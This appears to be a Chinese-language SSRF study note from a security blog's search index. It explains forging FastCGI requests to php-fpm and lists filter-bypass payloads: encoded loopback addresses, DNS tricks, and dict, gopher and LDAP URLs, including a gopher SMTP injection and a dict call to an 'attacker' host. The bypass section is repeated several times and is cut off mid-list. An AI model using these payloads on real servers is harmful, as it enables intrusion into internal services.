fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#fastcgi协议"},{"categories":["web","notes"],"content":"\r0x6 url结构url结构遵循RFC1738标准，结构如下： URI=scheme:[//authority]path[?query][#fragment] 其中authority可以表示为 [userinfo@]host[:port] scheme由一串大小写不敏感的字符组成，表示获取资源所需要的协议，俗称协议头 authority中的userinfo是一个可选项，一般HTTP使用匿名形式来获取数据，如果需要身份验证，格式为username:password@来表示 host是指在哪个服务器上获取资源，一般所见可以是域名形式，也可以是IP形式，包括IPv4和IPv6 port为服务器端口，http协议默认为80端口，而HTTPS协议默认是443端口，ftp协议是21端口，访问时使用默认端口，可以将端口省略 path为资源路径，一般用/进行分层，可以是基于文件的目录，也可以是基于路由的分层 query是指查询字符串，这里是可以动态改变的，我们前面也学过，可以用key=value形式的，也可以用index.php/Home/User/Index形式的pathinfo格式 fragment表示页面上的片段ID，一般不会跟随浏览器发送到服务器上，页面中一般表示为锚点，用#开头，所以我们在GET请求中，如果要发送#，就必须进行urlencode编码，否则就会认为是锚点 ","date":"2023-11-17","objectID":"/ssrf/:0:6","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x6-url结构"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://\u003cuser-auth\u003e@\u003chost\u003e:\u003cport\u003e/d:\u003cword\u003e ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x7-ssrf绕过"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#1攻击本地"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#2利用"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#3利用"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#4利用短地址"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#5利用特殊域名"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ 